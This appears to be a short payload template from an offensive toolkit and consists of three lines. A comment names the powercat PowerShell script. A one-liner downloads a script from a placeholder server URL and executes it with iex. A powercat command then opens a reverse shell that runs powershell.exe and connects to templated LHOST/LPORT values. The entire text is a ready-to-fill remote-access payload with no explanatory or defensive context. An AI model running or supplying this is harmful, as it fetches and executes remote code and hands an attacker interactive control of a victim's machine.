# https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
iex (New-Object System.Net.Webclient).DownloadString('§SRVURL§')
powercat -c {{ LHOST }} -p {{ LPORT }} -e powershell.exe
